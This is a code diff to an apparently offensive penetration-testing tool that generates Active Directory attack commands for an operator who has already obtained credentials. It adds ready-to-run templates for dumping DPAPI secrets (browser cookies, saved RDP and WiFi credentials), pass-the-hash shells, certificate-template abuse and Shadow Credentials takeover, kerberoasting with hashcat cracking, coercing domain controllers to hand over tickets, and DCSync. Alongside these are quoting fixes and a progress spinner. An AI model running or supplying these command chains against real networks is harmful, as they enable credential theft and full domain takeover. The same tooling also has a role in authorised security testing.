@@ -601,6 +601,11 @@ SUGGEST_RULES: list[SuggestRule] = [
             "enum4linux-ng -A -u {quser} -p {qpw} {qip}"),
         ("dump SAM + LSA + cached creds (needs local admin)",
             "impacket-secretsdump {url_pw}"),
+        ("DPAPI secrets — browser creds, WiFi keys, saved RDP/creds (local admin)",
+            "nxc smb {qip} -u {quser} -p {qpw} --dpapi\n"
+            "# add 'cookies' to also pull browser cookies; nxc decrypts with the\n"
+            "# machine masterkey it grabs as SYSTEM. Often the fastest win on a\n"
+            "# workstation — saved creds a user typed into RDP / a browser."),
         ("SYSTEM shell (needs local admin)",
             "impacket-psexec {url_pw}"),
         ("exec fallbacks (if psexec fails)",
@@ -703,14 +708,19 @@ SUGGEST_RULES: list[SuggestRule] = [
     )),
     SuggestRule(AuthType.KERBEROS, "ssh", commands=(
         ("shell via the ticket cache (GSSAPI)",
-            "ssh -o GSSAPIAuthentication=yes -o PreferredAuthentications="
-            "gssapi-with-mic -K {quser}@{ip}"),
+            "ssh -o GSSAPIAuthentication=yes -o GSSAPIDelegateCredentials=no "
+            "-o PreferredAuthentications=gssapi-with-mic {quser}@{ip}\n"
+            "# NOT delegating your TGT (no -K): a delegated ticket is "
+            "harvestable on the target.\n"
+            "# add -K only if you deliberately need onward Kerberos auth FROM "
+            "that host."),
         ("after login — quick local enum",
             "sudo -l\nid\nls -la /home /opt /var/www 2>/dev/null"),
     )),
     SuggestRule(AuthType.PASSWORD, "ftp", commands=(
-        ("interactive (active mode)",
-            "ftp -A {qip}"),
+        ("log in with the found creds",
+            "ftp ftp://{user_at_host}\n"
+            "# or interactively:  ftp {qip}   (then enter {quser} / the password)"),
         ("recursive pull",
             "wget -r {ftp_url}"),
     )),
@@ -782,6 +792,8 @@ SUGGEST_RULES: list[SuggestRule] = [
             "nxc smb {qip} -u {quser} -H {qhash} --rid-brute"),
         ("dump SAM + LSA (needs local admin) [PtH]",
             "impacket-secretsdump {url_nopw} -hashes :{nthash}"),
+        ("DPAPI secrets — browser/WiFi/saved creds (local admin) [PtH]",
+            "nxc smb {qip} -u {quser} -H {qhash} --dpapi"),
         ("SYSTEM shell (needs local admin) [PtH]",
             "impacket-psexec {url_nopw} -hashes :{nthash}"),
         ("exec fallbacks [PtH]",
@@ -804,16 +816,20 @@ SUGGEST_RULES: list[SuggestRule] = [
     SuggestRule(AuthType.HASH, "winrm", commands=(
         ("interactive shell [PtH]",
             "evil-winrm -i {qip} -u {quser} -H {qhash}"),
+        ("confirm exec without a full shell [PtH]",
+            "nxc winrm {qip} -u {quser} -H {qhash} -x whoami"),
     )),
     SuggestRule(AuthType.HASH, "wmi", commands=(
         ("semi-interactive shell [PtH]",
             "impacket-wmiexec {url_nopw} -hashes :{nthash}"),
+        ("exec fallback if wmiexec fails [PtH]",
+            "impacket-smbexec {url_nopw} -hashes :{nthash}"),
         ("quick command exec [PtH]",
             "nxc wmi {qip} -u {quser} -H {qhash} -x whoami"),
     )),
     SuggestRule(AuthType.HASH, "rdp", commands=(
         ("RDP session [PtH]",
-            "{rdp_bin} /u:{quser} /pth:{qhash} /d:{qdom} /v:{qip} "
+            "{rdp_bin} /u:{quser} /pth:{nthash} /d:{qdom} /v:{qip} "
             "/dynamic-resolution /drive:share,/home/kali /cert:ignore"),
         ("screenshot the desktop [PtH]",
             "nxc rdp {qip} -u {quser} -H {qhash} --screenshot"),
@@ -979,17 +995,25 @@ SUGGEST_RULES: list[SuggestRule] = [
             "nxc ldap {qip} -u {quser} -p {qpw} --gmsa"),
         ("AD CS — find vulnerable templates, then request as a target",
             "nxc ldap {qip} -u {quser} -p {qpw} -M adcs\n"
-            "certipy find -u {quser}@{dom_plain} -p {qpw} -dc-ip {ip} "
+            "certipy find -u {qupn} -p {qpw} -dc-ip {ip} "
             "-vulnerable -stdout\n"
             "# ESC1 (template allows SAN): request as Administrator, then PKINIT:\n"
-            "certipy req -u {quser}@{dom_plain} -p {qpw} -dc-ip {ip} \\\n"
-            "  -ca <CA-NAME> -template <TEMPLATE> -upn administrator@{dom_plain} \\\n"
+            "certipy req -u {qupn} -p {qpw} -dc-ip {ip} \\\n"
+            "  -ca <CA-NAME> -template <TEMPLATE> -upn {qupn_admin} \\\n"
             "  -sid <DOMAIN-SID>-500\n"
             "# ^ -sid is REQUIRED on anything patched for KB5014754 (strong\n"
             "#   certificate mapping); the domain SID comes from the lookupsid\n"
             "#   line in the trusts block above.\n"
             "certipy auth -pfx administrator.pfx -dc-ip {ip}\n"
             "# ^ returns the NT hash (UnPAC-the-hash) + a usable TGT"),
+        ("certipy — always run find first; Shadow Credentials if you can write a target",
+            "# 1. discover ADCS + every ESC in one shot (run even if -M adcs was quiet):\n"
+            "certipy find -u {qupn} -p {qpw} -dc-ip {ip} -vulnerable -stdout\n"
+            "# 2. Shadow Credentials — GenericWrite/GenericAll over ANY target (user\n"
+            "#    or computer) = takeover WITHOUT its password. certipy writes a key\n"
+            "#    to msDS-KeyCredentialLink, PKINITs, returns the hash:\n"
+            "certipy shadow auto -u {qupn} -p {qpw} -dc-ip {ip} -account <TARGET>\n"
+            "# ^ cleaner than RBCD: no MAQ, no new computer account."),
     )),
     SuggestRule(AuthType.HASH, "ldap", dc=True, commands=(
         ("delegation — enumerate (automatic unless --no-enrich) [PtH]",
@@ -1008,13 +1032,17 @@ SUGGEST_RULES: list[SuggestRule] = [
             "nxc ldap {qip} -u {quser} -H {qhash} --gmsa"),
         ("AD CS — find vulnerable templates [PtH]",
             "nxc ldap {qip} -u {quser} -H {qhash} -M adcs\n"
-            "certipy find -u {quser}@{dom_plain} -hashes :{nthash} -dc-ip {ip} "
+            "certipy find -u {qupn} -hashes :{nthash} -dc-ip {ip} "
             "-vulnerable -stdout\n"
-            "certipy req -u {quser}@{dom_plain} -hashes :{nthash} -dc-ip {ip} \\\n"
-            "  -ca <CA-NAME> -template <TEMPLATE> -upn administrator@{dom_plain} \\\n"
+            "certipy req -u {qupn} -hashes :{nthash} -dc-ip {ip} \\\n"
+            "  -ca <CA-NAME> -template <TEMPLATE> -upn {qupn_admin} \\\n"
             "  -sid <DOMAIN-SID>-500\n"
             "# ^ -sid required post-KB5014754 (strong certificate mapping)\n"
             "certipy auth -pfx administrator.pfx -dc-ip {ip}"),
+        ("certipy — always run find first; Shadow Credentials if you can write a target [PtH]",
+            "certipy find -u {qupn} -hashes :{nthash} -dc-ip {ip} -vulnerable -stdout\n"
+            "# Shadow Credentials over a writable target (no MAQ, no new computer):\n"
+            "certipy shadow auto -u {qupn} -hashes :{nthash} -dc-ip {ip} -account <TARGET>"),
     )),
 
     # ── After DCSync: the cross-domain continuation ─────────────────
@@ -1088,8 +1116,15 @@ def build_context(s: Success, ip: str, hostname: str, is_dc: bool,
         "smb_user": q(smb_user),
         "ldap_user": q(ldap_user),
         "user_ssh": q(f"{user}@{ip}"),
+        "user_at_host": q(f"{user}:{secret}@{ip}" if secret else f"{user}@{ip}"),
         "ftp_url": q(f"ftp://{user}:{secret}@{ip}/"),
         "dom_plain": domain or "<DOMAIN>",
+        # Shell-quoted user@domain, for tools that take a UPN as one argument
+        # (certipy -u). {quser}@{dom_plain} left the domain UNQUOTED, so a
+        # domain with a shell metacharacter (from a rogue host's nxc output)
+        # broke the command; this quotes the whole token safely.
+        "qupn": q(f"{user}@{domain}" if domain else user),
+        "qupn_admin": q(f"administrator@{domain}" if domain else "administrator"),
         "mssql_authflag": "" if s.local_auth else "-windows-auth",
         # Kali 2024+ ships xfreerdp3; older images only have xfreerdp. Pick
         # whichever is actually on PATH so a pasted command doesn't die with
@@ -1178,6 +1213,10 @@ _HINTS: dict[str, str] = {
         "needs DA or DS-Replication rights; krbtgt hash = golden tickets",
     "dump SAM + LSA + cached creds (needs local admin)":
         "LSA secrets often hold a service account password in cleartext",
+    "DPAPI secrets — browser creds, WiFi keys, saved RDP/creds (local admin)":
+        "saved creds a user actually typed — browsers, RDP, WiFi; often the fastest win",
+    "exec fallback if wmiexec fails [PtH]":
+        "smbexec needs only 445; wmiexec needs 135+445",
     "SYSTEM shell (needs local admin)":
         "drops a service binary — noisy; wmiexec/smbexec are quieter",
     "exec fallbacks (if psexec fails)":
@@ -1210,6 +1249,8 @@ _HINTS: dict[str, str] = {
         "LAPS gives local admin on that one host; gMSA is often a service identity",
     "AD CS — find vulnerable templates, then request as a target":
         "ESC1 = any template with SAN + client auth = DA cert",
+    "certipy — always run find first; Shadow Credentials if you can write a target":
+        "find shows every ESC; shadow = takeover via key write, no password needed",
     "delegation — enumerate (run under --no-enrich; otherwise automatic)":
         "an SPN pointing at the DC is domain compromise, not a lateral move",
 
@@ -1270,6 +1311,8 @@ _HINTS: dict[str, str] = {
         "reuse an existing ccache — no password/hash needed",
     "recursive pull":
         "mirror a whole share locally, then grep the loot at leisure",
+    "log in with the found creds":
+        "check for uploads, config backups, and web-root write access",
     "connect":
         "interactive session on the share",
     "list exports":
@@ -1299,6 +1342,8 @@ _LABEL_ALIASES = {
     "enumerate users via SAMR": "enumerate users via SAMR (RID brute)",
     "dump SAM + LSA (needs local admin)":
         "dump SAM + LSA + cached creds (needs local admin)",
+    "DPAPI secrets — browser/WiFi/saved creds (local admin)":
+        "DPAPI secrets — browser creds, WiFi keys, saved RDP/creds (local admin)",
     "dump SAM + LSA": "dump SAM + LSA + cached creds (needs local admin)",
     "SYSTEM shell": "SYSTEM shell (needs local admin)",
     "exec fallbacks": "exec fallbacks (if psexec fails)",
@@ -1321,7 +1366,6 @@ _LABEL_ALIASES = {
         "Kerberoast — on the target if impacket fails (Rubeus)",
     "Kerberoast": "Kerberoast — SPN tickets (from Kali)",
     "interactive shell": "shell (no host-key prompts)",
-    "interactive (active mode)": "shell (no host-key prompts)",
     "lateral movement via SCShell — use when psexec/smbexec fail":
         "_scshell",
     "lateral movement via SCShell [PtH] — use when psexec/smbexec fail":
@@ -1743,19 +1787,22 @@ def _parse_maq(text: str) -> "int | None":
 
 
 def _parse_roast_sweep(text: str) -> list[str]:
-    """Account names from a domain-wide `--kerberoasting` run. nxc prints a
-    display line 'sAMAccountName: <name>, memberOf: ...' per roastable account
-    (verified against source). We collect those names; the TGS hashes go to the
-    file, which we ignore."""
+    """sAMAccountName values from an LDAP --query for SPN-bearing user
+    accounts. One fast query (no per-account TGS requests) so it works
+    through a pivot and stays quiet. Output format (verified vs nxc source
+    ldap.py::query): 'sAMAccountName       <value>' per object, attribute name
+    left-padded to 20, no marker. Preserves original case; drops krbtgt."""
     names: list[str] = []
     if not text:
         return names
     for raw in text.splitlines():
         line = _ANSI_RE.sub("", raw)
-        m = _re_hints.search(r"sAMAccountName:\s*([^,]+?)(?:,|$)", line)
-        if m:
-            n = _clean_ext(m.group(1).strip(), 64)
-            if n and n not in names:
+        m = _QUERY_BANNER_RE.match(line)
+        body = (line[m.end():] if m else line).lstrip(" \t")
+        parts = body.split(None, 1)
+        if len(parts) == 2 and parts[0].lower() == "samaccountname":
+            n = _clean_ext(parts[1].strip(), 64)
+            if n and n.lower() != "krbtgt" and n not in names:
                 names.append(n)
     return names
 
@@ -2060,9 +2107,9 @@ def _coerce_block(ctx: dict, listener: str, as_comment: bool = False) -> str:
                    f"{q(dom + '/' + you + ':' + secret)}@{ip} {listener}\n")
 
     return (
-        f"{p}# find which coercion methods work, firing at your listener:\n"
+        f"{p}# coercion — which methods fire at your listener:\n"
         f"{p}nxc smb {ip} -u {you} {cred} -M coerce_plus -o LISTENER={listener}\n"
-        f"{p}# or a single method with the standalone tools (any ONE):\n"
+        f"{p}# or one standalone method (any ONE):\n"
         f"{p}python3 PetitPotam.py -u {you} {pp_cred} {listener} {ip}\n"
         + pb_line
         + f"{p}#   coercer.py coerce -u {you} {co_cred} -t {ip} -l {listener}\n")
@@ -2127,29 +2174,25 @@ def _emit_unconstrained(row: DelegRow, ctx: dict) -> list[tuple[str, str]]:
                         f"(a payoff for a host you own, not a way in)",
                 why=f"{acct} decrypts any TGT forwarded to it, and it is not "
                     f"a DC — so coerce the DC to it and catch the TGT")
-            + f"# ══ PATH (a): you have an elevated shell ON {host} ══\n"
-              f"# 1. start the catcher on {host} (elevated PowerShell), leave running:\n"
+            + f"# ══ PATH (a): elevated shell ON {host} ══\n"
+              f"# 1. start the catcher (elevated PowerShell), leave running:\n"
               f"Rubeus.exe monitor /interval:5 /nowrap /filteruser:{k['dc_nb']}$\n"
-              f"# 2. from Kali, coerce the DC to authenticate to {host}:\n"
+              f"# 2. coerce the DC to {host}:\n"
               + _coerce_block(ctx, host)
-              + f"# 3. Rubeus prints a base64 TGT for {k['dc_nb']}$ — copy it, then\n"
-              f"#    on {host} inject it:\n"
+              + f"# 3. Rubeus prints a base64 TGT — inject it on {host}:\n"
               f"Rubeus.exe ptt /ticket:<base64-blob>\n"
-              f"# 4. with the DC TGT in memory, DCSync from {host}:\n"
+              f"# 4. DCSync from {host}:\n"
               f"Rubeus.exe ptt /ticket:<base64-blob> ; "
               f"mimikatz # lsadump::dcsync /domain:{dom} /all\n"
               f"#\n"
-              f"# ══ PATH (b): you have {host}'s machine hash, working from Kali ══\n"
-              f"# 1. start krbrelayx in the FOREGROUND with the machine key; it\n"
-              f"#    listens and writes a .ccache when a TGT arrives (krbrelayx is\n"
-              f"#    dirkjanm's, NOT impacket; capture mode takes NO -t):\n"
+              f"# ══ PATH (b): {host}'s machine hash, from Kali ══\n"
+              f"# 1. start krbrelayx (foreground; writes a .ccache on receipt):\n"
               f"krbrelayx.py -hashes :<{host}-nthash>\n"
-              f"# 2. add a DNS record so the DC can resolve your listener by NAME\n"
-              f"#    (an IP forces NTLM = no forwarded TGT):\n"
+              f"# 2. DNS record so the DC resolves your listener by NAME:\n"
               f"{dnsline}\n"
-              f"# 3. coerce the DC to that NAME (run in a second terminal):\n"
+              f"# 3. coerce the DC to that NAME (second terminal):\n"
               + _coerce_block(ctx, k['fake'] + '.' + dom)
-              + f"# 4. krbrelayx drops '{k['dc_nb']}$@{dom}.ccache' — use it to DCSync:\n"
+              + f"# 4. DCSync with the dropped ccache:\n"
               f"export KRB5CCNAME='{k['dc_nb']}$@{dom}.ccache'\n"
               f"impacket-secretsdump -k -no-pass -just-dc {k['dc_fqdn']}",
         )]
@@ -2164,16 +2207,13 @@ def _emit_unconstrained(row: DelegRow, ctx: dict) -> list[tuple[str, str]]:
                 f"authenticates to one of its SPNs, so you must become that "
                 f"service")
         + _deleg_getcred_block(row, ctx)
-        + f"# 1. with {acct}'s hash, start krbrelayx in the FOREGROUND — it\n"
-          f"#    decrypts the forwarded TGT with the account key and writes a\n"
-          f"#    .ccache (krbrelayx is dirkjanm's, not impacket):\n"
+        + f"# 1. start krbrelayx with {acct}'s hash (foreground, writes ccache):\n"
           f"krbrelayx.py -hashes :<{acct}-nthash>\n"
-          f"# 2. point one of {acct}'s SPN hostnames at you via DNS, so the\n"
-          f"#    coerced auth reaches your listener as Kerberos:\n"
+          f"# 2. point one of {acct}'s SPN hostnames at you via DNS:\n"
           f"{dnsline}\n"
           f"# 3. coerce the DC to that SPN name (second terminal):\n"
           + _coerce_block(ctx, k['fake'] + '.' + dom)
-          + f"# 4. krbrelayx writes '{k['dc_nb']}$@{dom}.ccache' — DCSync with it:\n"
+          + f"# 4. DCSync with the dropped ccache:\n"
           f"export KRB5CCNAME='{k['dc_nb']}$@{dom}.ccache'\n"
           f"impacket-secretsdump -k -no-pass -just-dc {k['dc_fqdn']}",
     )]
@@ -2260,40 +2300,64 @@ def _deleg_getcred_block(row: DelegRow, ctx: dict) -> str:
     already confirmed the SPN is there."""
     if _deleg_account_is_self(row.account, ctx):
         return ""          # you authenticated AS this account — you have its secret
-    if not row.roast_checked:
-        return ""
     k = _deleg_known(ctx)
-    you, cred, ip, dom = k["you"], k["you_cred"], k["ip"], k["dom"]
+    you, ip, dom = k["you"], k["ip"], k["dom"]
     acct = row.account
+    host = acct.rstrip("$")
+
+    if not row.roast_checked:
+        # Enrichment could not resolve this account (offline --deleg-in, or the
+        # query/parse missed it). Don't guess "not roastable" — emit BOTH roast
+        # attempts so the operator can just run them; whichever the account
+        # supports produces a hash, the other returns nothing.
+        if row.is_computer:
+            # machine cleartext is rarely crackable; hash from a dump is realistic
+            return ""
+        return (
+            f"# ── GET THE CRED: {acct} — try both roasts (not pre-resolved):\n"
+            f"# kerberoast (if it has an SPN):\n"
+            f"impacket-GetUserSPNs -request-user {acct} -dc-ip {ip} \\\n"
+            f"  {_impacket_self(ctx)} -outputfile {host}.roast\n"
+            f"# AS-REP roast (if pre-auth is disabled):\n"
+            f"impacket-GetNPUsers {dom}/{acct} -request -no-pass -format hashcat \\\n"
+            f"  -dc-ip {ip} -outputfile {host}.asrep\n"
+            f"hashcat -m 13100 {host}.roast /usr/share/wordlists/rockyou.txt   # or -m 18200 {host}.asrep\n"
+            f"# then use the cracked secret below.\n#\n")
 
     if row.kerberoastable:
+        # impacket splits these: -request-user for users, -request-machine for
+        # machine accounts (it queries objectCategory=computer). Using the wrong
+        # one silently finds nothing.
+        req = (f"-request-machine {acct}" if row.is_computer
+               else f"-request-user {acct}")
         return (
-            f"# ── GET THE CRED: {acct} holds an SPN — kerberoastable now:\n"
-            f"nxc ldap {ip} -u {you} {cred} \\\n"
-            f"  --kerberoasting {acct.rstrip('$')}.roast "
-            f"--kerberoast-account {acct}\n"
+            f"# ── GET THE CRED: {acct} holds an SPN — kerberoastable now.\n"
+            f"# Per-account via impacket (works on any version):\n"
+            f"impacket-GetUserSPNs {req} -dc-ip {ip} \\\n"
+            f"  {_impacket_self(ctx)} -outputfile {acct.rstrip('$')}.roast\n"
             f"hashcat -m 13100 {acct.rstrip('$')}.roast "
             f"/usr/share/wordlists/rockyou.txt\n"
             f"# then use the cracked secret below.\n#\n")
     if row.asrep_roastable:
         return (
-            f"# ── GET THE CRED: {acct} has no preauth — AS-REP roastable now:\n"
-            f"nxc ldap {ip} -u {you} {cred} \\\n"
-            f"  --asreproast {acct.rstrip('$')}.asrep "
-            f"--no-preauth-targets {acct}\n"
+            f"# ── GET THE CRED: {acct} has no preauth — AS-REP roastable now.\n"
+            f"# Per-account via impacket (no creds even needed for the request):\n"
+            f"impacket-GetNPUsers {dom}/{acct} -request -no-pass -format hashcat \\\n"
+            f"  -dc-ip {ip} -outputfile {acct.rstrip('$')}.asrep\n"
             f"hashcat -m 18200 {acct.rstrip('$')}.asrep "
             f"/usr/share/wordlists/rockyou.txt\n"
             f"# then use the cracked secret below.\n#\n")
     if not row.is_computer:
-        # checked, has neither an SPN nor preauth-disabled: offer to PLANT an
-        # SPN temporarily (nxc does this and cleans up), which needs GenericWrite
-        # over the account — cheap to try, states the requirement.
+        # checked, has neither an SPN nor preauth-disabled: plant a temp SPN,
+        # roast, remove it. Needs GenericWrite over the account. targetedKerberoast.py
+        # is the standalone tool for this (github.com/ShutdownRepo/targetedKerberoast);
+        # nxc only grew a wrapper for it on an unreleased branch.
         return (
             f"# ── GET THE CRED: {acct} is not roastable as-is. If you have\n"
             f"# GenericWrite over it, plant a temp SPN, roast, auto-remove:\n"
-            f"nxc ldap {ip} -u {you} {cred} \\\n"
-            f"  --kerberoasting {acct}.roast --targeted-kerberoast {acct}\n"
-            f"hashcat -m 13100 {acct}.roast /usr/share/wordlists/rockyou.txt\n"
+            f"targetedKerberoast.py -v -d {dom} -u {you} -p {q(k['secret'])} \\\n"
+            f"  --request-user {acct}\n"
+            f"hashcat -m 13100 <hash-file> /usr/share/wordlists/rockyou.txt\n"
             f"# otherwise its hash must come from a dump.\n#\n")
     return ""
 
@@ -2565,9 +2629,13 @@ def delegation_file_text(rows: list[DelegRow], ctx: dict, target: str,
         lines.append("")
         for name in _clean_list(sweep):
             lines.append(f"#   {name}")
-        lines.append("# roast all:  nxc ldap <dc> -u <you> <cred> "
-                     "--kerberoasting all.roast")
-        lines.append("# crack:      hashcat -m 13100 all.roast rockyou.txt")
+        _sk = _deleg_known(ctx)
+        _nxc_cred = (f"-H {_sk['secret']}" if _sk["is_hash"]
+                     else f"-p {q(_sk['secret'])}")
+        lines.append(f"# roast all:  nxc ldap {_sk['ip']} -u {_sk['you']} "
+                     f"{_nxc_cred} --kerberoasting all.roast")
+        lines.append("# crack:      hashcat -m 13100 all.roast "
+                     "/usr/share/wordlists/rockyou.txt")
     return "\n".join(lines).rstrip() + "\n"
 
 
@@ -3205,6 +3273,7 @@ class Reporter:
             self._guests(result)
         if result.successes:
             self._delegation(result)
+            self._dc_self_delegation_note(result)
             self._suggestions(result)
         print(f"{'═' * BANNER_WIDTH}\n")
 
@@ -3551,7 +3620,31 @@ class Reporter:
                   f"{getattr(self, '_deleg_write_error', 'error')}{RESET}")
         print()
 
-    def _suggestions(self, result: TargetResult) -> None:
+    def _dc_self_delegation_note(self, result: TargetResult) -> None:
+        """The DC you're on is ITSELF unconstrained-delegation-trusted (every DC
+        is, by default) — findDelegation deliberately omits DCs, so it never
+        shows up as a delegation "finding". But with admin here it is a real
+        attack surface: coerce ANOTHER DC (e.g. a parent-domain DC across a
+        trust) to authenticate to this one and capture its TGT.
+
+        Printed independently of whether findDelegation found anything, so a DC
+        with zero delegation findings (the common case) still gets the pointer.
+        """
+        if self.sh or not result.is_dc:
+            return
+        if not any(s.is_admin for s in result.successes):
+            return
+        dcn = result.hostname or "this DC"
+        print(f"  {CYAN}{BOLD}🔑 This DC is unconstrained-trusted{RESET}")
+        print(f"  {'─' * (BANNER_WIDTH - 2)}")
+        print(f"    {DIM}Every DC is trusted for unconstrained delegation, so "
+              f"{dcn} is too — findDelegation omits DCs, so it won't appear as "
+              f"a finding above.{RESET}")
+        print(f"    {DIM}With admin here you can capture ANOTHER DC's TGT: run "
+              f"Rubeus monitor / krbrelayx on {dcn}, then coerce the other DC "
+              f"(e.g. a parent-domain DC over a trust) to authenticate here — "
+              f"then DCSync it. Same PATH (a)/(b) as an unconstrained finding.{RESET}")
+        print()
         # One block per DISTINCT credential (protocol + auth + scope + user),
         # so two different accounts that both authenticate on the same
         # protocol — e.g. a domain user and a local admin on SMB — each get
@@ -3982,6 +4075,15 @@ class TomSploit:
         self._progress_lock = threading.Lock()
         self._done = 0
         self._total = 0
+        # Phase-aware progress. The scan phase has a known task count and shows
+        # a real percentage; the enrichment phase (DC-only, variable number of
+        # LDAP queries) can't be pre-counted, so it shows a labelled spinner
+        # that advances as each query finishes and pulses while one runs — so
+        # the bar never looks hung at 100% while enrichment works.
+        self._phase = "scan"
+        self._phase_label = ""
+        self._phase_done = 0
+        self._phase_total = 0
 
         # Per-(protocol, scope) timeout budget, shared across the parallel
         # attempts now running against each one.
@@ -4061,8 +4163,23 @@ class TomSploit:
     def _progress_enabled(self) -> bool:
         return sys.stderr.isatty() and not self.cfg.quiet
 
+    _SPIN = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
+
     def _redraw(self) -> None:
-        if self._total <= 0 or not self._progress_enabled():
+        if not self._progress_enabled():
+            return
+        if self._phase == "enrich":
+            self._spin_i = (getattr(self, "_spin_i", 0) + 1) % len(self._SPIN)
+            frame = self._SPIN[self._spin_i]
+            count = (f" {self._phase_done}/{self._phase_total}"
+                     if self._phase_total else "")
+            lbl = f" · {self._phase_label}" if self._phase_label else ""
+            line = f"  {CYAN}{frame}{RESET} {DIM}enriching (DC){count}{lbl}{RESET} "
+            self._last_progress_len = len(line)
+            sys.stderr.write("\r" + line)
+            sys.stderr.flush()
+            return
+        if self._total <= 0:
             return
         done = min(self._done, self._total)   # never report >100%
         pct = int(100 * done / self._total)
@@ -4078,6 +4195,46 @@ class TomSploit:
         with self._progress_lock:
             self._done += n
             self._redraw()
+
+    def _enter_enrich_phase(self, total: int, label: str) -> None:
+        """Switch to the enrichment spinner and start a background pulse so the
+        spinner animates even while a single slow LDAP query runs (the reason
+        the bar looked hung at 100%)."""
+        with self._progress_lock:
+            self._phase = "enrich"
+            self._phase_total = total
+            self._phase_done = 0
+            self._phase_label = label
+            self._redraw()
+        self._pulse_stop = threading.Event()
+
+        def _pulse():
+            while not self._pulse_stop.wait(0.2):
+                if self._stop.is_set():
+                    break
+                with self._progress_lock:
+                    if self._phase == "enrich":
+                        self._redraw()
+        self._pulse_thread = threading.Thread(target=_pulse, daemon=True)
+        self._pulse_thread.start()
+
+    def _enrich_step(self, label: str = "") -> None:
+        with self._progress_lock:
+            self._phase_done += 1
+            if label:
+                self._phase_label = label
+            self._redraw()
+
+    def _exit_enrich_phase(self) -> None:
+        stop = getattr(self, "_pulse_stop", None)
+        if stop is not None:
+            stop.set()
+        t = getattr(self, "_pulse_thread", None)
+        if t is not None:
+            t.join(timeout=1)
+        with self._progress_lock:
+            self._phase = "scan"
+            self._phase_label = ""
 
     def _clear_progress(self) -> None:
         if not self._progress_enabled():
@@ -5146,49 +5303,60 @@ class TomSploit:
             # ms-DS-MachineAccountQuota: decides whether RBCD "add a computer"
             # and the self-RBCD path are even available (0 = dead).
             "maq":   ["-M", "maq"],
-            # domain-wide kerberoastable sweep: every SPN account you could
-            # roast right now, independent of delegation. --kerberoasting with
-            # no -account filter targets the whole domain; we only PARSE the
-            # account list here (the file is written but not used).
-            "roast": ["--kerberoasting", "/tmp/.tomsploit_sweep.roast"],
+            # domain-wide roastable-account list. NOT --kerberoasting: that
+            # requests a TGS for every SPN account (hundreds of round-trips),
+            # which times out through a pivot and is noisy. One LDAP query for
+            # SPN-bearing user accounts gives the same list, fast and quiet.
+            "roast": ["--query",
+                      "(&(servicePrincipalName=*)(!(objectClass=computer)))",
+                      "sAMAccountName"],
         }
         outs: dict[str, str] = {}
-        with ThreadPoolExecutor(max_workers=4) as pool:
-            futs = {k: pool.submit(self._enrich_nxc, target, cred, v)
-                    for k, v in jobs.items()}
-            for k, f in futs.items():
-                try:
-                    outs[k] = f.result()
-                except Exception:
-                    outs[k] = ""
+        # Enrichment phase: the parallel jobs, plus roastability + daclread
+        # after. Shows a labelled spinner so the bar never sits hung at 100%.
+        self._enter_enrich_phase(len(jobs) + 2, "delegation, LAPS, gMSA, ADCS")
+        try:
+            with ThreadPoolExecutor(max_workers=4) as pool:
+                futs = {k: pool.submit(self._enrich_nxc, target, cred, v)
+                        for k, v in jobs.items()}
+                for k, f in futs.items():
+                    try:
+                        outs[k] = f.result()
+                    except Exception:
+                        outs[k] = ""
+                    self._enrich_step()
 
-        result.deleg_rows = parse_delegation_output(outs.get("deleg", ""))
-        # Resolve the HOW: for exactly the delegation accounts, is each one
-        # kerberoastable / AS-REP-roastable right now? One targeted query, so
-        # the delegation file can state a fact and emit the command instead of
-        # printing "kerberoast it if it holds an SPN".
-        if result.deleg_rows:
-            try:
-                self._enrich_roastability(target, cred, result.deleg_rows)
-            except Exception:
-                pass          # leaves roast_checked False -> emitters fall back
-        # 'Getting GMSA Passwords' is nxc's own display() banner, not a finding.
-        result.laps_hits = self._enrich_highlights(outs.get("laps", ""))
-        result.gmsa_hits = self._enrich_highlights(
-            outs.get("gmsa", ""), drop_prefixes=("Getting GMSA",))
-        result.adcs_hits = self._enrich_highlights(outs.get("adcs", ""))
-        result.maq = _parse_maq(outs.get("maq", ""))
-        result.roastable_sweep = _parse_roast_sweep(outs.get("roast", ""))
-        # Per-account DIRECT-ACE write check (daclread). Only for accounts that
-        # a write would actually help: user delegating accounts (plant an SPN)
-        # and RBCD victims. Group-inherited rights are invisible to daclread —
-        # BloodHound (already suggested) covers those.
-        if result.deleg_rows:
-            try:
-                self._enrich_dacls(target, cred, result.deleg_rows)
-            except Exception:
-                pass
-        result.enriched = True
+            result.deleg_rows = parse_delegation_output(outs.get("deleg", ""))
+            # Resolve the HOW: for exactly the delegation accounts, is each one
+            # kerberoastable / AS-REP-roastable right now? One targeted query,
+            # so the file can state a fact and emit the command instead of
+            # printing "kerberoast it if it holds an SPN".
+            self._enrich_step("resolving roastability")
+            if result.deleg_rows:
+                try:
+                    self._enrich_roastability(target, cred, result.deleg_rows)
+                except Exception:
+                    pass      # leaves roast_checked False -> emitters fall back
+            # 'Getting GMSA Passwords' is nxc's display() banner, not a find.
+            result.laps_hits = self._enrich_highlights(outs.get("laps", ""))
+            result.gmsa_hits = self._enrich_highlights(
+                outs.get("gmsa", ""), drop_prefixes=("Getting GMSA",))
+            result.adcs_hits = self._enrich_highlights(outs.get("adcs", ""))
+            result.maq = _parse_maq(outs.get("maq", ""))
+            result.roastable_sweep = _parse_roast_sweep(outs.get("roast", ""))
+            # Per-account DIRECT-ACE write check (daclread). Only for accounts
+            # a write would help: user delegating accounts (plant an SPN) and
+            # RBCD victims. Group-inherited rights are invisible to daclread —
+            # BloodHound (already suggested) covers those.
+            self._enrich_step("checking write ACLs")
+            if result.deleg_rows:
+                try:
+                    self._enrich_dacls(target, cred, result.deleg_rows)
+                except Exception:
+                    pass
+            result.enriched = True
+        finally:
+            self._exit_enrich_phase()
 
         bits = []
         if result.deleg_rows:
@@ -5235,13 +5403,21 @@ class TomSploit:
         if not out:
             return
         info = _parse_roast_query(out)
+        if not info:
+            return          # query ran but nothing parsed — leave all unchecked
         for r in rows:
             rec = info.get(r.account.lower())
+            if rec is None:
+                # This account was NOT in the parsed result. Do NOT mark it
+                # checked: a missing match must fall back to the honest
+                # "kerberoast if it has an SPN" conditional, never masquerade
+                # as a definitive "not roastable" (which is what a checked row
+                # with no SPN/preauth becomes).
+                continue
             r.roast_checked = True
-            if rec:
-                r.own_spn = rec.get("spn", "")
-                r.uac = rec.get("uac", 0)
-                r.allowed_to = rec.get("allowed_to", [])
+            r.own_spn = rec.get("spn", "")
+            r.uac = rec.get("uac", 0)
+            r.allowed_to = rec.get("allowed_to", [])
 
     def _enrich_dacls(self, target: str, cred: "Success", rows: list) -> None:
         """Per-account DIRECT-ACE write check. Runs nxc daclread against each
